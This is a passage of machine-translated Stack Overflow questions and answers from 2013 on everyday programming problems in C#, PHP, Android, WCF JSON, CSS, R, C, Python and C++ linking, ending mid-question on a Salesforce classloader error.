在 C# 控制台应用程序中，~~我正在使用[stringbuilder 将数据写入本地文件](https://github.com/cledwyn/OracleToCSVdotnetConsoleApp/blob/76843c3a53cf1bcc7508a7c0a992243e718cf489/Program.cs)。~~ 似乎是对特殊字符处理不当

```
Muñoz 
```

输出到文件为

```
MuÃ±oz 
```

如何正确管理它有点不知所措。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:43:34.750

您的 C# 代码正确编写了一个 UTF8 文件，其中`ñ`编码为 3 个字节。

您错误地将文件*读取*为不同的编码，将这些字节显示为三个不需要的字符。
您需要以 UTF8 格式读取文件。

# php - 使用doctrine2-nestedset围绕li标签包装分层数据

> ID：15392590
> 
> 赞同：0
> 
> 时间：2013-03-13T17:42:26.680
> 
> 标签：php, symfony, doctrine-orm, hierarchical-data

我正在使用[https://github.com/blt04/doctrine2-nestedset](https://github.com/blt04/doctrine2-nestedset)来管理我的分层数据。

它使用以下数据库结构管理层次结构：

```
 categories
 -id
 -root
 -lft
 -rgt
 -name 
```

我需要用 li 标签包装一个节点，如下所示：

```
 Vehicles
    Bikes
       Pulsor
       Hero Honda
    Automobiles
    Trucks 
```

这个包提供了以下操作节点的方法：

```
$tree=fetchTreeAsArray($nodeId);  //fetches tree for that node
$node->getNumberDescendants();    //returns all descendants for that node 
```

更多方法描述在[https://github.com/cbsi/doctrine2-nestedset/blob/master/README.markdown](https://github.com/cbsi/doctrine2-nestedset/blob/master/README.markdown)

我想将节点包裹在 li 标签周围：

到目前为止我试过这个：

```
 $tree = $nsm->fetchTreeAsArray(8);
    $treeLiTags="<ul>";
    foreach ($tree as $node) {
        $treeLiTags.="<li>".$node;
        if ($node->hasChildren()) {
            echo $node->getNumberDescendants();
            $treeLiTags.="<ul>";
            $closeParent=true;
        }
        else {
            if ($closeParent && !$node->hasNextSibling()) {
                $closeParent=false;
                $treeLiTags.="</ul>";
            }
            $treeLiTags.="</li>";
        }
    }
    $treeLiTags.="</ul>";
    echo $treeLiTags; 
```

这将返回如下：

```
Vehicles
    Bikes
       Pulsor
       Hero Honda
          250 cc
       Automobiles
       Trucks 
```

我应该得到：

```
Vehicles
   Bikes
      Pulsor
      Hero Honda
         250 cc
   Automobiles
   Trucks 
```

任何算法都会有帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T20:39:27.750

您是否考虑过使用[嵌套集（树）的](https://github.com/l3pp4rd/DoctrineExtensions/blob/master/doc/tree.md)[Doctrine Extensions](https://github.com/l3pp4rd/DoctrineExtensions) 实现？

它已经实现了您想要实现的目标 - 您可以简单地使用：

```
$repo = $em->getRepository('Entity\Category');
$options = array(
    'decorate' => true,
    'rootOpen' => '<ul>',
    'rootClose' => '</ul>',
    'childOpen' => '<li>',
    'childClose' => '</li>',
    'nodeDecorator' => function($node) {
        return '<a href="/page/'.$node['slug'].'">'.$node[$field].'</a>';
    }
);
$htmlTree = $repo->childrenHierarchy(
    null, /* starting from root nodes */
    false, /* load all children, not only direct */
    $options
); 
```

# .net - 如何将 CustomAttribute 构造函数转换为 il 代码

> ID：15392592
> 
> 赞同：0
> 
> 时间：2013-03-13T17:42:27.950
> 
> 标签：.net, mono.cecil

我正在尝试实现我自己的 aop 框架（如 PostSharp）。并且遇到了一个问题。

说有一个属性：

```
[AttributeUsage(AttributeTargets.Method)]
public class LogAttribute : Attribute
{
    public LogAttribute(int level, Type type)
    {
        // init fields...
    }
    public virtual void OnEnter(LogEventArg e)
    {
        // do some stuff...
    }
} 
```

这适用于其中一种方法：

```
[Log(3, typeof(Trace))]
static void TestMethod1(string s)
{
     // do some stuff...
} 
```

现在的问题是：如何将其转换为：

```
static void TestMethod1(string s)
{
     var t = new LogAttribute(3, typeof(Trace));
     t.OnEnter()
     // do some stuff...
} 
```

我想从方法中剥离属性而不是使用这样的东西：

```
var m = System.Reflection.MethodBase.GetCurrentMethod();
var attr = (LogAttribute) Attribute.GetCustomAttribute(m, typeof(Log)); 
```

使用 Mono.Cecil 我有 CustomAttributes.Constructor (MethodReference) 和 CustomAttributes.ConstructorArguments，它们具有“类型”和“值”属性。但是如何将其转换为 il 指令？？？

我唯一能写的是：

```
il.InsertBefore(inst0, Instruction.Create(OpCodes.Newobj, attr.Constructor)); 
```

但是如何将参数传递给这个构造函数，就像它被声明的那样？我需要一个不依赖于特定构造函数实现的通用选项。

# android - AsyncTask - 如何从 OnPostExecute 访问 GUI 元素

> ID：15392597
> 
> 赞同：3
> 
> 时间：2013-03-13T17:42:46.007
> 
> 标签：android, android-activity

我有一个具有以下工作流程的应用程序：

用户键入他的研究关键字的主要活动 -> 单击“搜索”按钮 -> 启动 AsyncTask 对 Web 服务进行查询（在 doInBackground 方法中处理的查询） -> 创建新活动。

现在我想在这个新活动中显示 web 服务结果。我能怎么做 ？我知道我应该使用“onPostExecute”，但 AyncTask 对象无法通过“onPostExecute”方法访问这个新的 Activity。有什么线索吗？

谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:46:29.377

> 如何从 OnPostExecute 访问 GUI 元素

制作一个活动并获取视图`onCreate(bundle)`并将一个定义`AsyncTask`为内部类。

```
public class MainActivity extends Activity
{ 
    TextView textView;
    public void onCreate(Bundle bundle){
         ....
        textView = (TextView)findViewById(R.id.textview);
    } 
```

`AsyncTask`在这个类里面声明。

```
 private class UpdateUiAsyncTask extends AsyncTask<Void, Void, Void>{
      ........
      .....
     protected void onPostExecute(String result) {
      textView.setText(result);
     }
  }
} 
```

# .net - WCF - 如何在 JSON 中序列化和反序列化？

> ID：15392600
> 
> 赞同：6
> 
> 时间：2013-03-13T17:42:57.900
> 
> 标签：.net, json, wcf, serialization

我在 WCF 中编写了几个类（数据合同和服务合同），我正在尝试在 JSON 中序列化和反序列化。如果我需要以下 JSON 结构，我将如何创建 DataContract(s)：

```
{
  "response": {
    "locations": {
      "location": [
        {
          "id": "12",
          "name": "Hello",
          "statusid": "78"
        },
        {
          "id": "5",
          "name": "Ann",
          "statusid": "8"
        }
      ]
    },
    "error": "404 error"
  }
} 
```

上面的结构非常简单，在位置下可以有多个位置细节，如上所述。所以我需要得到一个数组/列表到“位置”数据成员，如下所述。目前我只有以下 DataContract：

```
[DataContract]
    public class Response
    {
        [DataMember]
        public string locations { get; set; }

        [DataMember]
        public string error{ get; set; }
    } 
```

请让我知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-13T19:33:34.953

您要查找的完整对象应构造为：

```
[DataContract(Name="response")]
public class Response
{
    [DataMember(Name = "locations")]
    public IEnumerable<Location> Locations { get; set; }

    [DataMember(Name = "error")]
    public string Error { get; set; }
}

[DataContract(Name = "location")]
public class Location
{
    [DataMember(Name = "id")]
    public string Id { get; set; }

    [DataMember(Name = "name")]
    public string Name { get; set; }

    [DataMember(Name = "statusid")]
    public string StatusId { get; set; }
} 
```

您需要设置对象层次结构，如 和 所示`{`，`}`以及 IEnumerable / 数组属性，如所需 JSON 输出中的`[`和所示。`]`

该站点可能会造成混淆，因为没有简单的示例，但请查看[介绍 JSON](http://www.json.org/)以获得对语法的基本了解。我遇到的另一个很好的站点是[ASP.NET Web API 中的 JSON 和 XML 序列化，](http://www.asp.net/web-api/overview/formats-and-model-binding/json-and-xml-serialization)仅提供了一些简单的示例。

感谢 vittore 的一些指导，我注意到要构建与 JSON 输出完全匹配的对象，您将需要以下对象：

```
[DataContract]
public class ResponseParent
{
    [DataMember(Name = "response")]
    public Response ResponseInstance { get; set; }
}

[DataContract]
public class Response
{
    [DataMember(Name = "locations")]
    public LocationCollectionIntermediate Locations { get; set; }

    [DataMember(Name = "error")]
    public string Error { get; set; }
}

[DataContract]
public class LocationCollectionIntermediate
{
    [DataMember(Name = "location")]
    public IEnumerable<Location> Locations { get; set; }
}

[DataContract]
public class Location
{
    [DataMember(Name = "id")]
    public string Id { get; set; }

    [DataMember(Name = "name")]
    public string Name { get; set; }

    [DataMember(Name = "statusid")]
    public string StatusId { get; set; }
} 
```

我在这里将这些添加到第二个代码块中，因为这样的结构看起来不必要地复杂。但是，如果您处于可以更改 JSON 的预期输出的位置，我将使用第一个块，另外更改将两`Id`列转换为`int`类型。

创建这些类型是为了支持类似于在[WCF Service 中设置以返回 JSON](http://forums.asp.net/t/1349424.aspx)的服务，并使用以下代码进行测试：

```
string json;
using (var ms = new MemoryStream())
{
    var ser = new System.Runtime.Serialization.Json.DataContractJsonSerializer(typeof(ResponseParent));
    ser.WriteObject(ms, r);
    json = System.Text.Encoding.UTF8.GetString(ms.GetBuffer(), 0, Convert.ToInt32(ms.Length)); 
} 
```

[DataContractJsonSerializer](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.json.datacontractjsonserializer.aspx)的详细信息

另请注意，如果您可以选择设置 RESTful Web 服务，则可以遵循[如何在 60 秒内创建 JSON WCF RESTful 服务](http://www.codeproject.com/Articles/167159/How-to-create-a-JSON-WCF-RESTful-Service-in-60-sec)的指南。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-04-27T10:41:26.300

一旦有了准确的属性结构，您还可以使用[JavaScriptSerializer](https://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer%28v=vs.110%29.aspx)类`System.Web.Script.Serialization`（自 .NET 3.5 起）

像这样的东西会起作用：

```
string jsonString;

JavaScriptSerializer serializer = new JavaScriptSerializer();
Response responseObject = serializer.Deserialize<Response>(jsonString); 
```

甚至比 using 更简单`DataContractSerializer`，尽管我不完全确定它的注意事项。我已经多次使用它，没有任何问题。

您还可以添加自定义[JavaScriptConverter](https://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptconverter%28v=vs.110%29.aspx) ，这样可以相对轻松地实现[更好的动态 JSON 解析方式。](http://www.drowningintechnicaldebt.com/ShawnWeisfeld/archive/2010/08/22/using-c-4.0-and-dynamic-to-parse-json.aspx)

这样动态解析也很简单：

```
string jsonString;

JavaScriptSerializer serializer = new JavaScriptSerializer();
dynamic responseObject = serializer.Deserialize<object>(jsonString);

responseObject["locations"] = ... 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-13T19:00:47.027

访问[http://json.codeplex.com/](http://json.codeplex.com/)。利用

```
JsonConvert.SerializeObject() 
```

将您的对象转换为 JSON 字符串。利用

```
JsonConvert.PopulateObject 
```

将 JSON 字符串转换为对象。

# android - 如果不是字母“A”，则阻止输入

> ID：15392602
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:43:01.957
> 
> 标签：android, android-edittext

如果用户没有输入，我该怎么做，`A`那么就不会有任何输出？我想在`EditText`.

代码：

```
InputFilter filter = new InputFilter() { 
            public CharSequence filter(CharSequence source, int start, int end, Spanned dest, int dstart, int dend) { 
                    for (int i = start; i < end; i++) { 
                            if (!Character.toString(source.charAt(i)).equals("a")) { 
                                    return ""; 
                            } 
                    } 
                    return null; 
            } 
        }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:09:44.823

您可以使用输入过滤器按照您尝试的方式执行此操作，但我建议您改为使用 XML 执行此操作，方法是为您的 edittext 提供属性`android:digits="Aa"`。那应该可以解决您的问题。

如果你需要使用输入过滤器试试这个（它未经测试，可能不会比你的更好）

```
InputFilter filter = new InputFilter() { 
            public CharSequence filter(CharSequence source, int start, int end, Spanned dest, int dstart, int dend) { 
                    String chars = "";
                    for (int i = start; i < end; i++) { 
                            if (Character.toString(source.charAt(i)).equals("a")) { 
                                    chars = chars + source.charAt(i);
                            } else {
                                //don't add anything to the char sequence
                            }
                    } 
                    return chars; 
            } 
        }; 
```

# css - CSS：溢出：自动+指定宽度

> ID：15392603
> 
> 赞同：0
> 
> 时间：2013-03-13T17:43:02.127
> 
> 标签：css

示例：http: [//jsfiddle.net/5VCfm/2/embedded/result/](http://jsfiddle.net/5VCfm/2/embedded/result/)

```
.container {
    position: absolute;
    border: 1px solid red;
    max-width: 90%;
    margin-bottom: 20px
}
.container + .container {
    top: 260px;
}
.content-container {
    border: 1px solid green;
    max-height: 200px;
    overflow: auto;
    padding: 15px;
}
.content-wrap {
    border: 1px solid navy;
}
.content {
    border: 1px solid red;
    padding: 10px;
} 
```

html

```
<div class="container">
    <div class="content-container">
        <div class="content-wrap">
            <div class="content">
                 <h2>No width</h2>
                large content see http://jsfiddle.net/5VCfm/2/embedded/result/
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="content-container">
        <div class="content-wrap">
            <div class="content" style="width:300px">
                 <h2>Width 300px</h2>
                large content see http://jsfiddle.net/5VCfm/2/embedded/result/
            </div>
        </div>
    </div>
</div> 
```

如果指定了容器内元素的宽度，他会移除父级的边缘，创建水平滚动。在 Mozilla 和 Chrome 中最具特色的行为。但是 Opera 和 IE 显示都可以。如何解决问题？是错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:45:13.150

父容器有一个`max-width:90%`, 意味着它会尽可能地变小，但它永远不会超过视口宽度的 90%。

当这个 90% 小于 300px（child）时，水平滚动条正在创建，这个过程是完全正常的，你只需要意识到 child 有一个固定的宽度，它不会变小。

`max-width:300px;`在 上使用，如果可以的`.content`话，这将允许它具有 300 像素的宽度，但是当父级 (90%) 较小时，它会变得更紧。

[**演示**](http://jsfiddle.net/PVKuJ/)

# r - 单元格大于零或无穷大

> ID：15392606
> 
> 赞同：2
> 
> 时间：2013-03-13T17:43:09.617
> 
> 标签：r, loops, if-statement

所以我有一个通过矩阵的双循环，它读取每个单元格的内容，如果单元格的内容大于零，它会做一些事情。问题是矩阵中也没有实数，例如 Inf。我想要的是以下内容：

```
 if (Cell < 0 or inf) {do something} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:46:27.740

采用：

```
if (Cell < 0 || is.infinite(Cell)) { ... } 
```

与您问题中的代码类似，这将检查数字是否*小于零*；更改条件以检查数字是否*大于零*是微不足道的。

# c# - Imagelist 总是返回 -1

> ID：15392607
> 
> 赞同：0
> 
> 时间：2013-03-13T17:43:09.813
> 
> 标签：c#, imagelist

我正在使用 Windows 窗体设计一个小游戏，其中有 5 个标签，每个标签都类似于来自指定图像列表的骰子图像（ 1 - 6 ）。游戏被“滚动”3次，在滚动结束时，您可以通过更改背景颜色来选择不滚动的标签。在每卷结束时，计算并显示模具面的总和。

现在的问题...

我知道我的标签可以到达图像列表，因为骰子的“滚动”功能效果很好。每个标签都设置为通过一个计时器滴答事件运行，该事件将发生 10 次，其中从图像列表中选择随机图像，从而产生掷骰子的错觉。但是，当我希望使用 imagelist 索引在滚动循环结束时添加模具面的总数时，每个索引都返回 -1。请注意，每个相应骰子的索引比骰子的数量小一。同样，如果您有一个类似 1 的骰子，它的索引将为零。我通过在索引中加 1 来说明这一点。所以......虽然我可能有一个 5,5,6,4,3 - 我的分数计数器等于 0，而不是说 23。

当最低可用索引为 0 时，为什么 imgaelist 索引会给出 -1 的值？

这是我的代码。模具面总和的实际计算在 else 语句中进行。在评估总和之前，我将 m_iScore（分数计数器）设置为零，因为我希望总和代表每次滚动后的面。

```
private void timer1_Tick(object sender, EventArgs e)
        {
            Label[] labelArray = new Label[] { label1, label2, label3, label4, label5 };
            Random randnum = new Random();
            if (m_iAnimations < 10)
            {
                for (int iCount = 0; iCount < labelArray.Length; iCount++)
                {
                    if ((labelArray[iCount]).BackColor == Color.Lime)
                    {
                        (labelArray[iCount]).Image = imageList1.Images[randnum.Next(0, 6)];
                    }
                }
                m_iAnimations++;
            }
            else
            {
                timer1.Enabled = false;
                m_iAnimations = 0;
                m_iScore = 0;
                for (int iCount = 0; iCount < labelArray.Length; iCount++)
                {
                    m_iScore = m_iScore + ((labelArray[iCount]).ImageIndex + 1);
                }
                scoreval.Text = m_iScore.ToString();
            }

        } 
```

如果我不将 1 添加到图像索引， scoreval.Text 显示 -5。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:47:10.000

设置`Image`属性不会改变`ImageIndex`属性——它们或多或少完全不相关。

一般来说，UI 应该*显示*程序状态，而不是*保持*它。完成所有计算，然后将计算结果推送到 UI；不要像变量一样使用 UI 元素。

# php - 带有拆分字符串的 PHP 数组列表

> ID：15392611
> 
> 赞同：-3
> 
> 时间：2013-03-13T17:43:19.807
> 
> 标签：php, arrays, string

我想使用这个功能：

```
 array explode ( string $delimiter , string $string [, int $limit ] ) 
```

我如何在 Array 中使用 Explode 和 Put 结果？

例如，“你好，我在这里”

然后，我想把这个数组循环到它的全尺寸，得到一个字符串中的每个单词，而它有更多的元素，

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:21:10.897

根据[PHP 手册](http://php.net/manual/en/function.preg-split.php)

```
 array preg_split ( string $pattern , string $subject [, int $limit = -1 [, int $flags = 0 ]] ) 
```

> 通过正则表达式拆分给定的字符串。

试试这个：

```
<?php
// split the phrase by any number of commas or space characters,
// which include " ", \r, \t, \n and \f
$keywords = preg_split("/[\s,]+/", "hypertext language, programming");
print_r($keywords);
?> 
```

上面的示例将输出：

```
Array
(
    [0] => hypertext
    [1] => language
    [2] => programming
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:12:06.613

explode() 函数需要一个 $delemeter 将字符串分成几个部分并将每个部分存储在数组中。它不能为空，因此无法满足您的要求。

但是，您可以尝试以下方法

$string = "你好我在这里";

如果你希望你的数组是 array('H','e','l','l','o','I','a','m','h','e','关于'）。那么这里有一个解决方案。

```
$resultArray = array();
for($i=0;$i<strlen($string);$i++){
    $val = substr($string,$i,1);
    if($val!=' ')
        $resultArray[] = $val;
}
print_r($resultArray); // expected output 
```

# c - 确定用户是否按下了选项卡

> ID：15392615
> 
> 赞同：1
> 
> 时间：2013-03-13T17:43:37.750
> 
> 标签：c, tabs

所以我正在编写一个程序，其中的任务是确定用户是否按下了选项卡。因此，当他按下制表符时，我应该在控制台上打印一些东西（或执行制表符完成等）。我的问题是如何在没有用户按 Enter 的情况下执行此操作。我尝试查看 ncurses，但找不到一个简单的示例来教我如何使用 tab 来完成。

编辑：使用 Linux

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T21:28:40.637

从技术上讲，这不是 C 语言问题，而是操作系统或运行时环境的问题。在 POSIX 系统上，您至少必须将终端设置为非规范模式。

如果需要，规范模式会缓冲键盘输入以进一步处理它们（例如，这允许您在应用程序看到它们之前擦除字符）。

有很多方法可以切换到非规范模式。当然，您可以使用许多不同的库 ncurses 等。但背后的技巧是一组称为 termios 的系统调用。您需要做的是读取 POSIX 终端的当前属性并根据您的需要进行相应的修改。例如 ：

```
struct termios old, new;

/* read terminal attributes */
tcgetattr(STDIN_FILENO,&old);

/* get old settings */
new=old;

/* modify the current settings (common: switch CANON and ECHO) */
new.c_lflag &=(~ICANON & ~ECHO);

/* push the settings on the terminal */
tcsetattr(STDIN_FILENO,TCSANOW,&new);

do_what_you_want_and_read_every_pressed_char();

/* ok, restore initial behavior */
tcsetattr(STDIN_FILENO,TCSANOW,&old); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:11:41.640

`ncurses`您可以使用和`getch()`函数对输入进行操作。它会为按下的键返回一个 int 值，您可以通过查看返回是否为 9 来检查选项卡。此代码将循环显示按下的内容，直到它是一个选项卡然后它退出。

```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <ncurses.h>

int main() {  
  int c;
  initscr();    /* Start curses mode */
  cbreak();
  noecho();
  while(9 != (c = getch())) {
    printw("%c\n", c);
    if(halfdelay(5) != ERR) {   /* getch function waits 5 tenths of a second */
      while(getch() == c)
        if(halfdelay(1) == ERR) /* getch function waits 1 tenth of a second */
        break;
    }
    printw("Got a %d\n", c);
    cbreak();
  }
  endwin();
  return 0; 
} 
```

# php - 每 3 个项目的 foreach() 循环

> ID：15392618
> 
> 赞同：-4
> 
> 时间：2013-03-13T17:43:50.333
> 
> 标签：php

我想在每 3 个项目结果上重复一个循环。我正在阅读一个包含 .jpg 的文件夹，并希望将它们分成 3 组。

所以结果看起来像这样：

```
<div>
   <img src="1.jpg"/>
   <img src="2.jpg"/>
   <img src="3.jpg"/>
</div>
<div>
   <img src="4.jpg"/>
   <img src="5.jpg"/>
   <img src="6.jpg"/>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:07:00.833

猜想你已经得到了文件数组：

```
 $count = 0;
    echo '<div>';
    foreach ($array as $images) {

         echo '<img src="'.$images.'.jpg" />';
         if ($count%3==0) echo '</div><div>'; 
         $count++;
    }
    echo '</div>'; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:44:51.660

假设您的数据始终是 3 的倍数：

```
 for ($i = 0; $i < $numTotal; $i += 3) {
        echo '<div>
               <img src="' . $i + 1 . '.jpg"/>
               <img src="' . $i + 2 . '.jpg"/>
               <img src="' . $i + 3 . '.jpg"/>
              </div>';  
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:55:57.483

这是一个解决方案：

```
<?php

$my_array = array();

$my_array[] = "1.jpg";
$my_array[] = "2.jpg";
$my_array[] = "3.jpg";
$my_array[] = "4.jpg";
$my_array[] = "5.jpg";
$my_array[] = "6.jpg";

$content = "";

$i = 0;

foreach($my_array as $img_name)
    {

    if($i === 0)
        {       
                $content .= "<div>";
        }

        $content .= "<img src=\"" . $img_name . "\"/>"; 

    $i++;

    if($i === 3)
        {
            $content .= "</div>";   
            $i = 0; 
        }
    }

echo $content; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:57:29.860

将模数的值更改为按更小/更大的尺寸分组

```
echo "<div>";
for($i=1;$i<=$maxImg;$i++) {
  echo "<img src=\"".${i}.".jpg\"/>";
  if(mod($i,3) == 0 && $i < $maxImg) {
    echo "</div>";
    echo "<div>";
    }
  }
echo "</div>"; 
```

# python - 在范围字典中查找值 - python

> ID：15392623
> 
> 赞同：0
> 
> 时间：2013-03-13T17:44:04.360
> 
> 标签：python, dictionary, range

我将 2 个文件与初始标识符列、起始值和结束值进行比较。第二个文件包含相应的标识符和另一个值列。

前任。

文件 1：

```
A     200     900
A     1000    1200
B     100     700
B     900     1000 
```

文件 2：

```
A     103
A     200
A     250
B     50
B     100
B     150 
```

我想从第二个文件中找到包含在第一个文件中找到的范围内的所有值，以便我的输出如下所示：

```
A     200
A     250
B     100
B     150 
```

现在我已经从第一个文件中创建了一个包含范围列表的字典：例如。

```
if Identifier in Dictionary:
    Dictionary[Identifier].extend(range(Start, (End+1)))
else:
    Dictionary[Identifier] = range(Start, (End+1)) 
```

然后我浏览第二个文件并在范围字典中搜索值：例如。

```
if Identifier in Dictionary:
    if Value in Dictionary[Identifier]:
    OutFile.write(Line + "\n") 
```

虽然这对于相对较小的文件来说不是最佳的，但是我有几个大文件，而且这个程序被证明是非常低效的。我需要优化我的程序，使其运行得更快。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:05:26.263

```
from collections import defaultdict
ident_ranges = defaultdict(list)
with open('file1.txt', 'r') as f1
    for row in f1:
        ident, start, end = row.split()
        start, end = int(start), int(end)
        ident_ranges[ident].append((start, end))
with open('file2.txt', 'r') as f2, open('out.txt', 'w') as output:  
    for line in f2:
        ident, value = line.split()
        value = int(value)
        if any(start <= value <= end for start, end in ident_ranges[ident]):
            output.write(line) 
```

**注意**：使用 a`defaultdict`允许您在字典中添加范围，而无需先检查键是否存在。使用`any`允许范围检查的短路。使用链式比较是一个不错的 Python 语法快捷方式 ( `start <= value <= end`)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:51:26.810

由于您有很大的范围，而您的问题本质上只是一堆比较，因此存储开始/结束元组几乎肯定比整个范围更快（尤其是因为您现在拥有的将复制如果两个碰巧重叠）。

```
# Building the dict
if not ident in d:
    d[ident] = (lo, hi)
else:
    old_lo, old_hi = d[ident]
    d[ident] = (min(lo, old_lo), max(hi, old_hi)) 
```

然后你的比较看起来像：

```
# comparing...
if ident in d:
    if d[ident][0] <= val <= d[ident][1]:
        outfile.write(line+'\n') 
```

如果您不单独检查`if ident in d`. Python 字典既好又快，所以首先调用它。你有能力为字典提供默认值，所以使用它。我没有对这个或任何东西进行基准测试以了解加速是什么，但你肯定会得到一些，而且它确实有效：

```
# These both make use of the following somewhat silly hack:
# In Python, None is treated as less than everything (even -float('inf))
# and empty containers (e.g. (), [], {}) are treated as greater than everything.
# So we use the tuple ((), None) as if it was (float('inf'), float('-inf))

for line in file1:
    ident, lo, hi = line.split()
    lo = int(lo)
    hi = int(hi)
    old_lo, old_hi = d.get(ident, ((), None))
    d[ident] = (min(lo, old_lo), max(hi, old_hi))

# comparing:
for line in file2:
    ident, val = line.split()
    val = int(val)
    lo, hi = d.get(ident, ((), None))
    if lo <= val <= hi:
        outfile.write(line) # unless you stripped it off, this still has a \n 
```

上面的代码是我用来测试的；它`file2`在几秒钟内运行一百万行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:51:41.773

你需要建造`range(START, END)`吗？当您可以这样做时，这似乎很浪费：

```
if START <= x <= END:
    # process 
```

检查值是否在范围内很慢，因为 a) 您必须构造列表 b) 对列表执行线性搜索以找到它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:58:48.183

你可以尝试这样的事情：

```
In [27]: ranges=defaultdict(list)

In [28]: with open("file1") as f:
    for line in f:
        name,st,end=line.split()
        st,end=int(st),int(end)
        ranges[name].append([st,end])
   ....:         

In [30]: ranges
Out[30]: defaultdict(<type 'list'>, {'A': [[200, 900], [1000, 1200]], 'B': [[100, 700], [900, 1000]]})

In [29]: with open("file2") as f:
    for line in f:
        name,val=line.split()
        val=int(val)
        if any(y[0]<=val<=y[1] for y in ranges[name]):
            print name,val
   ....:             
A 200
A 250
B 100
B 150 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-13T18:08:18.133

巧妙的技巧：Python 允许您`in`与对象进行比较，这比使用 a`xrange`快得多，并且内存效率更高。`in``range`

所以，你可以做

```
from collections import defaultdict

rangedict = defaultdict(list)
...
rangedict[ident].append(xrange(start, end+1))
...

for i in rangedict:
    for r in rangedict[i]:
        if v in r:
            print >>outfile, line 
```

# c++ - 编译和链接调用 C++ 函数的 C 代码

> ID：15392632
> 
> 赞同：0
> 
> 时间：2013-03-13T17:44:30.460
> 
> 标签：c++, c

从我的 C 代码调用 C++ 方法时出现问题。我需要在 C++ 代码中调用的方法不在一个类中。我正在尝试设置一个简单的示例，并且我有以下文件：

```
//header.h
#ifdef __cplusplus
#include <iostream>
extern "C" {
#endif
int print(int i, double d);
#ifdef __cplusplus
}
#endif

//ccode.c
#include "header.h"

main() {
        printf("hello");
        print(2,2.3);
}

//cppcode.cc
#include "header.h"
using namespace std;
int print(int i, double d)
{
    cout << "i = " << i << ", d = " << d;
} 
```

可能我的错误在于我试图编译和链接它的方式。我正在执行以下操作：

```
g++ -c cppcode.cc -o cppcode.o 
```

这很好。

```
gcc ccode.c cppcode.o -o ccode 
```

在这里，我收到以下错误：

```
cppcode.o: In function `print':
cppcode.cc:(.text+0x16): undefined reference to `std::cout'
cppcode.cc:(.text+0x1b): undefined reference to `std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)'
cppcode.cc:(.text+0x28): undefined reference to `std::basic_ostream<char, std::char_traits<char> >::operator<<(int)'
cppcode.cc:(.text+0x35): undefined reference to `std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)'
cppcode.cc:(.text+0x42): undefined reference to `std::basic_ostream<char, std::char_traits<char> >::operator<<(double)'
cppcode.o: In function `__static_initialization_and_destruction_0(int, int)':
cppcode.cc:(.text+0x6b): undefined reference to `std::ios_base::Init::Init()'
cppcode.cc:(.text+0x70): undefined reference to `std::ios_base::Init::~Init()'
collect2: ld returned 1 exit status 
```

我假设发生这种情况是因为我使用的是 C 编译器。编译和链接这个小例子的正确方法是什么？这个想法是我让 C 代码运行并且只调用 C++ 函数，而不必用 C 重写它们。在此先感谢您的帮助！

我使用的是 Ubuntu 12.04，gcc 版本 4.6.3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:50:44.130

您需要链接 C++ 运行时库。

```
gcc ccode.c cppcode.o -o ccode -lstdc++ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:51:19.360

您应该单独编译和链接。用于`g++`链接以获得正确的标准库。

```
g++ -c cppcode.cc -o cppcode.o
gcc -c ccode.c -o ccode.o
g++ ccode.o cppcode.o -o ccode 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:51:17.770

g++ 编译器会自动将您的程序与标准 cpp 库链接。当您使用 gcc 编译时，链接器可以找到对它的引用。你有两个选择。一种是用g++编译c文件。二是强制标准cpp库的联动。

这是 gcc 指南中写的内容：-static-libstdc++

```
When the g++ program is used to link a C++ program, it normally automatically links against libstdc++. If libstdc++ is available as a shared library, and the -static option is not used, then this links against the shared version of libstdc++. That is normally fine. However, it is sometimes useful to freeze the version of libstdc++ used by the program without going all the way to a fully static link. The -static-libstdc++ option directs the g++ driver to link libstdc++ statically, without necessarily linking other libraries statically. 
```

运行以下命令：

```
gcc ccode.c cppcode.o -o ccode -lstdc++ 
```

# salesforce - 尝试创建帐户对象时出现类加载器错误

> ID：15392634
> 
> 赞同：1
> 
> 时间：2013-03-13T17:44:34.637
> 
> 标签：salesforce

尝试执行该行时`Account a = new Account();`，我收到错误

```
at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
